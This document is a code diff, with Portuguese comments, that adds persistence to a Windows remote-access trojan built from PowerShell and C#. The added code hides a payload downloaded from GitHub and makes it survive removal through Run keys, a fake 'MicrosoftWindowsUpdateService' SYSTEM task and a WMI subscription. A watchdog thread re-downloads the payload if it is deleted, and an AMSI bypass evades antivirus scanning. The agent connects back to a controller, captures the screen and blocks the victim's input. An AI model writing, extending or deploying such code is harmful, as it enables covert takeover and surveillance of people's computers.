@@ -14,15 +14,59 @@ if (-not $isAdmin) {
     exit
 }
 
-$scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
-New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force -ErrorAction SilentlyContinue | Out-Null
-try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
-try {
-    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
-} catch {}
-attrib +h +s +r $scriptPath 2>$null
+# ===== CAMINHOS E VBS WRAPPER =====
+$dir = "$env:ProgramData\Microsoft\Windows\Caches"
+$scriptPath = "$dir\$installName.ps1"
+$vbsPath = "$dir\$installName.vbs"
 
+New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
+try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
+
+# Cria o VBS que roda o PowerShell invisível (0 = Hidden, False = Não espera)
+$vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '""", 0, False'
+Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
+
+# Oculta os arquivos no sistema
+attrib +h +s +r $scriptPath 2>$null
+attrib +h +s +r $vbsPath 2>$null
+
+# ===== PERSISTÊNCIA E AUTO-REPARO =====
+function Install-Persistence {
+    # 1. Registro (HKCU e HKLM)
+    $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
+    try {
+        Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
+    } catch {}
+
+    # 2. Agendador de Tarefas (Roda como SYSTEM no Boot e a cada 5 min)
+    try {
+        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
+        $trigger1 = New-ScheduledTaskTrigger -AtStartup
+        $trigger2 = New-ScheduledTaskTrigger -AtLogOn
+        $trigger3 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365)
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
+        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2,$trigger3 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
+    } catch {}
+
+    # 3. WMI Event Subscription
+    try {
+        $filterName = "WindowsUpdateFilter"
+        $consumerName = "WindowsUpdateConsumer"
+        Get-WmiObject __eventFilter -namespace root\subscription -filter "name='$filterName'" -ErrorAction SilentlyContinue | Remove-WmiObject
+        Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='$consumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject
+        $query = "SELECT * FROM __InstanceModificationEvent WITHIN 900 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+        $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{ Name = $filterName; EventNameSpace = 'root\cimv2'; QueryLanguage = "WQL"; Query = $query }
+        $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{ Name = $consumerName; CommandLineTemplate = "wscript.exe //B //Nologo `"$vbsPath`"" }
+        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{ Filter = $WMIEventFilter; Consumer = $WMIEventConsumer } -ErrorAction SilentlyContinue | Out-Null
+    } catch {}
+}
+
+# Instala a persistência na primeira execução
+Install-Persistence
+
+# ===== AMSI BYPASS =====
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
 
@@ -37,6 +81,8 @@ if (-not ("R9KAgent" -as [type])) {
     using System.Threading;
     using System.Net.Sockets;
     using System.Windows.Forms;
+    using Microsoft.Win32;
+    using System.Diagnostics;
 
     public class R9KAgent {
         [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
@@ -52,13 +98,16 @@ if (-not ("R9KAgent" -as [type])) {
         static bool streaming = false;
         static object writeLock = new object();
 
-        // Variáveis para a Trava de Mouse
         static bool isLocked = false;
         static int targetX = 0, targetY = 0;
         static bool hasNewPos = false;
 
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
+            
+            // Inicia a Thread de Auto-Reparo (Watchdog)
+            Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
+
             while (true) {
                 try {
                     client = new TcpClient();
@@ -77,6 +126,37 @@ if (-not ("R9KAgent" -as [type])) {
 
                     while (client.Connected) Thread.Sleep(1000);
                 } catch { Thread.Sleep(3000); }
+            }
+        }
+
+        static void WatchdogLoop() {
+            string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
+            string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
+            
+            while (true) {
+                try {
+                    // Se o arquivo foi deletado, recria
+                    if (!File.Exists(scriptPath)) {
+                        string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
+                        using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); }
+                        File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
+                    }
+                    if (!File.Exists(vbsPath)) {
+                        string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\"\", 0, False";
+                        File.WriteAllText(vbsPath, vbs);
+                        File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
+                    }
+
+                    // Se a chave do registro foi deletada, recria
+                    string cmd = "wscript.exe //B //Nologo \"" + vbsPath + "\"";
+                    using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
+                        if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
+                    }
+                    using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
+                        if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
+                    }
+                } catch {}
+                Thread.Sleep(5000); // Verifica a cada 5 segundos
             }
         }
 
@@ -99,19 +179,17 @@ if (-not ("R9KAgent" -as [type])) {
             while (true) {
                 try {
                     if (isLocked) {
-                        // Se está travado, força o cursor de volta pra posição que o controlador deixou
                         if (Cursor.Position.X != targetX || Cursor.Position.Y != targetY) {
                             Cursor.Position = new Point(targetX, targetY);
                         }
                     } else {
-                        // Se não está travado, apenas move normalmente
                         if (hasNewPos) {
                             Cursor.Position = new Point(targetX, targetY);
                             hasNewPos = false;
                         }
                     }
                 } catch {}
-                Thread.Sleep(5); // Roda 200 vezes por segundo (impossível a vítima puxar o mouse)
+                Thread.Sleep(5);
             }
         }
 
@@ -131,19 +209,24 @@ if (-not ("R9KAgent" -as [type])) {
             try {
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; Send("STREAM_STOPPED"); return; }
-                if (cmd == "exit") { BlockInput(false); Environment.Exit(0); }
+                
+                // DESINSTALAÇÃO DEFINITIVA
+                if (cmd == "uninstall") { 
+                    BlockInput(false); 
+                    try {
+                        using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
+                        using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
+                        Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService /f").WaitForExit();
+                    } catch {}
+                    Environment.Exit(0); 
+                }
                 
                 if (cmd == "lock_mouse") {
-                    targetX = Cursor.Position.X; 
-                    targetY = Cursor.Position.Y;
-                    isLocked = true;
-                    BlockInput(true); 
-                    Send("MOUSE_LOCKED"); return;
+                    targetX = Cursor.Position.X; targetY = Cursor.Position.Y;
+                    isLocked = true; BlockInput(true); Send("MOUSE_LOCKED"); return;
                 }
                 if (cmd == "unlock_mouse") { 
-                    isLocked = false;
-                    BlockInput(false); 
-                    Send("MOUSE_UNLOCKED"); return; 
+                    isLocked = false; BlockInput(false); Send("MOUSE_UNLOCKED"); return; 
                 }
 
                 if (cmd == "screenshot") { Send("SCREEN:" + CaptureScreen(1920, 85)); return; }
@@ -151,8 +234,7 @@ if (-not ("R9KAgent" -as [type])) {
 
                 if (cmd.StartsWith("move ")) {
                     string[] p = cmd.Split(' ');
-                    int nx = int.Parse(p[1]);
-                    int ny = int.Parse(p[2]);
+                    int nx = int.Parse(p[1]); int ny = int.Parse(p[2]);
                     targetX = (int)((nx / 65535.0) * Screen.PrimaryScreen.Bounds.Width);
                     targetY = (int)((ny / 65535.0) * Screen.PrimaryScreen.Bounds.Height);
                     hasNewPos = true; 
@@ -200,4 +282,5 @@ if (-not ("R9KAgent" -as [type])) {
 "@
 }
 
+# Inicia o Agente
 [R9KAgent]::Start($serverIP, $serverPort)
